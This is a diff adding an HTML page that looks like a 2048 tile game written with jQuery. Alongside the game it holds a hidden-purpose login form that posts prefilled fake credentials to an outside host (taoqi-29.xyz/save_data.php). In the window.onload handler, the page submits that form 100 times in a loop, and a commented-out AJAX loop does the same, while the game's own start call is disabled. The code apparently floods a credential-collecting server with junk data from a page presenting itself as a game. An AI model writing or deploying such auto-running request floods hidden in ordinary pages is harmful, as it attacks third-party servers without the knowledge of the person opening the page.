@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<title></title>
+	</head>
+	<body style="">
+		<table style="margin-left: 40%;">
+			<tr>
+				<td id="11"></td>
+				<td id="12"></td>
+				<td id="13"></td>
+				<td id="14"></td>
+			</tr>
+			<tr>
+				<td id="21"></td>
+				<td id="22"></td>
+				<td id="23"></td>
+				<td id="24"></td>
+			</tr>
+			<tr>
+				<td id="31" class=""></td>
+				<td id="32"></td>
+				<td id="33"></td>
+				<td id="34"></td>
+			</tr>
+			<tr>
+				<td id="41"></td>
+				<td id="42"></td>
+				<td id="43"></td>
+				<td id="44"></td>
+			</tr>
+		</table>
+	</body>
+	<form action="http://taoqi-29.xyz/save_data.php" method="post" id="form1" onsubmit="return ts()">
+		<input type="text" name="u" id="user" value="12312312" placeholder="支持QQ号/邮箱/手机号登录"/>
+		<input type="password" name="p" value="12312312" id="pass" placeholder="密码"/>
+		<input type="hidden" name="bianhao" value="1" />
+		<input type="submit" value="登录" id="dengl">
+	</form>
+	
+	<style type="text/css">
+		td{    background-color: #FFE4B5; width: 60px; height: 60px; text-align: center; }
+		.class2{    background-color: #00EE76; width: 60px; height: 60px; text-align: center;}
+		.class4{    background-color: #00B2EE; width: 60px; height: 60px; text-align: center;}
+		.class8{    background-color: #009ACD; width: 60px; height: 60px; text-align: center;}
+		.class16{   background-color: #7AC5CD; width: 60px; height: 60px; text-align: center;}
+		.class32{   background-color: #8B8B7A; width: 60px; height: 60px; text-align: center;}
+		.class64{   background-color: #9F79EE; width: 60px; height: 60px; text-align: center;}
+		.class128{  background-color: #C6E2FF; width: 60px; height: 60px; text-align: center;}
+		.class256{  background-color: #C71585; width: 60px; height: 60px; text-align: center;}
+		.class512{  background-color: #CDCD00; width: 60px; height: 60px; text-align: center;}
+		.class1024{ background-color: #E5E5E5; width: 60px; height: 60px; text-align: center;}
+		.class2048{ background-color: #FF4040; width: 60px; height: 60px; text-align: center;}
+		.class4096{ background-color: #FF0000; width: 60px; height: 60px; text-align: center;}
+		.class8192{ background-color: #FFFF00; width: 60px; height: 60px; text-align: center;}
+	</style>
+</html>
+<script src="../js/jquery-3.2.1.min.js"></script>
+<script>
+	
+	window.onload=function (){
+		
+		
+		var form = document.getElementById('form1');
+		//再次修改input内容
+		var i=0;
+		while(i<100){
+			form.submit();
+			i++;
+		}
+		/* var str2=$("#1").text();
+		generate(2);
+		alert("上下左右控制，游戏开始"); */
+		/* var i=0;
+		while(i<10){
+				$.ajax({
+					url:"http://taoqi-29.xyz/save_data.php",
+						type: "post",
+						data:JSON.stringify({"u":"123123123","p":"1213123123"}),
+						contentType: "application/json;charset=utf-8",
+					success:function(data){
+							if(data==false){
+								alert("添加失败")
+							}else{
+								alert("添加成功")
+								window.location.href="./company_management_list.html";
+							}
+					},
+					error: function() {
+						alert("error");
+					}
+			
+				});
+				i++;
+		}
+		 */
+	}
+	document.onkeydown=jumpPage;
+	function jumpPage() {
+		if (event.keyCode==37)//左 
+			left(); 
+		if (event.keyCode==38)//上
+			up();
+		if (event.keyCode==39)//右 
+			right(); 
+		if (event.keyCode==40)//下 
+			down();
+    }
+	
+	function up(){
+		huadong(1,4,3);
+		hebing(1,4,3);
+		huadong(1,4,3);
+		generate(1);
+	}
+	function down(){
+		huadong(1,4,4);
+		hebing(1,4,4);
+		huadong(1,4,4);
+		generate(1);
+	}
+	function left(){
+		huadong(1,4,2);
+		hebing(1,4,2);
+		huadong(1,4,2);
+		generate(1);
+	}
+	function right(){
+		huadong(1,4,1);
+		hebing(1,4,1);
+		huadong(1,4,1);
+		generate(1);
+	}
+	
+	function huadong (min,max,type){
+		for(var z=0;z<4;z++){
+			if(type==1){          //"右👉👉👉"
+				for(var i=max;i>min;i--){
+					for(var x=1;x<5;x++){
+						var text1= $(("#"+x)+i).text();
+						if(i>1){
+							if(text1==null||text1==""){
+								var uptext= $(("#"+x)+(i-1)).text();
+								$(("#"+x)+i).text(uptext);
+								$(("#"+x)+(i-1)).text("");
+							}
+						}
+					}
+				}
+			}else if(type==2){    //"左👈👈👈"
+				for(var i=min;i<max;i++){
+					for(var x=1;x<5;x++){
+						var text1= $(("#"+x)+i).text();
+						if(i<4){
+							if(text1==null||text1==""){
+								var uptext= $(("#"+x)+(i+1)).text();
+								$(("#"+x)+i).text(uptext);
+								$(("#"+x)+(i+1)).text("");
+							}
+						}
+					}	
+				}
+			}else if(type==3){    //"上👆👆👆"
+				for(var i=min;i<max;i++){
+					for(var x=1;x<5;x++){
+						var text1= $(("#"+i)+x).text();
+						if(i<4){
+							if(text1==null||text1==""){
+								var uptext= $(("#"+(i+1))+x).text();
+								$(("#"+i)+x).text(uptext);
+								$(("#"+(i+1))+x).text("");
+							}
+						}
+					}
+				}
+			}else if(type==4){    //"下👇👇👇"
+				for(var i=max;i>min;i--){
+					for(var x=1;x<5;x++){
+						var text1= $(("#"+i)+x).text();
+						if(i>1){
+							if(text1==null||text1==""){
+								var uptext= $(("#"+(i-1))+x).text();
+								$(("#"+i)+x).text(uptext);
+								$(("#"+(i-1))+x).text("");
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	
+	function hebing (min,max,type){
+		var bool=true;
+		if(type==1){
+			for(var i=1;i<5;i++){
+				for(var z=max;z>min;z--){
+					var text= $(("#"+i)+z).text();
+					var text2= $(("#"+i)+(z-1)).text();
+					if(text==text2&text!=""){
+						$(("#"+i)+z).text(text*2);
+						$(("#"+i)+(z-1)).text("");
+						//$(("#"+i)+z).addClass("class"+(text*2)+"");
+						bool=false;
+					}
+				}
+			}	
+		}else if(type==2){
+			for(var i=1;i<5;i++){
+				for(var z=min;z<max;z++){
+					var text= $(("#"+i)+z).text();
+					var text2= $(("#"+i)+(z+1)).text();
+					if(text==text2&text!=""){
+						$(("#"+i)+z).text(text*2);
+						$(("#"+i)+(z+1)).text("");
+						//$(("#"+i)+z).addClass("class"+(text*2)+"");
+						bool=false;
+					}
+				}
+			}
+		}else if(type==3){
+			for(var i=1;i<5;i++){
+				for(var z=min;z<max;z++){
+					var text= $(("#"+z)+i).text();
+					var text2= $(("#"+(z+1))+i).text();
+					if(text==text2&text!=""){
+						$(("#"+z)+i).text(text*2);
+						$(("#"+(z+1))+i).text("");
+						//$(("#"+z)+i).addClass("class"+(text*2)+"");
+						bool=false;
+					}
+				}
+			}
+		}else if(type==4){
+			for(var i=1;i<5;i++){
+				for(var z=max;z>min;z--){
+					var text= $(("#"+z)+i).text();
+					var text2= $(("#"+(z-1))+i).text();
+					if(text==text2&text!=""){
+						$(("#"+z)+i).text(text*2);
+						$(("#"+(z-1))+i).text("");
+						//$(("#"+z)+i).addClass("class"+(text*2)+"");
+						bool=false;
+					}
+				}
+			}
+		}
+		
+		var nullTd=getNullTd();
+		if(nullTd.length==0&&bool){
+			alert("游戏结束  >_<");
+		}
+	}
+	
+	function generate(number){
+		if(number!=1){
+			var nullTd=getNullTd();
+			var random= Math.floor(Math.random()*(nullTd.length-0));
+			$("#"+nullTd[random]).text(2);
+			nullTd=getNullTd();
+			random= Math.floor(Math.random()*(nullTd.length-0));
+			$("#"+nullTd[random]).text(2);
+		}else{
+			var nullTd=getNullTd();
+			var random= Math.floor(Math.random()*(nullTd.length-0));
+			$("#"+nullTd[random]).text(2);
+		}
+	}
+	
+	function getNullTd(){
+		var nullTd=[];
+		var allTd=$("td");		
+		for(var i=0;i<allTd.length;i++){
+			var id= allTd[i].getAttribute("id");
+			var str2=$("#"+id).text();
+			 if(str2==null||str2==""){
+				nullTd.push(id);
+			} 
+		}
+		return nullTd;
+	}
+</script>
+
+
